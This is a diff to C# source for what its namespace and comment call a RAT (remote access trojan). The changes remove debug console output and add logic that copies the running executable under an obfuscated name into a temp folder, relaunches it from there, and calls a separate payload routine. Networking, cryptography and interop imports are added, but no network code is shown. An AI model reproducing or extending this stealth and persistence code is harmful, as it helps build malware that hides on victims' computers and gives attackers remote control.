@@ -1,10 +1,18 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
+
 
 namespace RAT
 {
@@ -12,8 +20,6 @@ namespace RAT
     {
         /*
          * This is a RAT to remove please redownload and execute <Filename>.exe /clean
-         * 
-         * 
          * 
          */
         public static String ran = "";
@@ -27,22 +33,19 @@ namespace RAT
             }
         }
         public static String[] files = new string[]
-            {
-            Path.GetTempPath()+"CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316"
-            };
+        {
+            Path.GetTempPath()+"\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316"
+        };
         static void Main(string[] args)
         {
             try
             {
                 random();
-                Console.WriteLine("[!] Starting");
                 try
                 {
                     if (args[0].Contains("clean")) { cleanup(); }
                 }
                 catch { }
-                Console.WriteLine("[!] Skipping Clean");
-                Console.WriteLine("[!] Hiding");
                 try
                 {
                     String[] fileloc = File.ReadAllLines(files[0]);
@@ -54,18 +57,18 @@ namespace RAT
                          * START PAYLOAD HERE
                          */
                         RAT.Payload.main();
-
-                        Console.WriteLine("[!] WOW now we are here! " + System.Reflection.Assembly.GetExecutingAssembly().Location);
-                        Console.ReadLine();
+                    }
+                    else
+                    {
+                        Hide();
                     }
                 }
                 catch (Exception e) { Console.WriteLine(e); }
-                Hide();
-                Console.WriteLine("[!] Hiding Done");
                 Console.ReadLine();
             }
             catch
             {
+                cleanup();
             }
         }
         public static void Hide()
@@ -91,9 +94,16 @@ namespace RAT
             }
             try
             {
-                Directory.CreateDirectory(Path.GetTempPath() + loc[0]);
-                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + loc[0] + "\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe");
-                restart(loc[0]);
+                if (!found)
+                {
+                    Directory.CreateDirectory(Path.GetTempPath() + loc[0]);
+                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + loc[0] + "\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe");
+                    restart(loc[0]);
+                }
+                else
+                {
+                    restart(loc[0]);
+                }
             }
             catch
             {
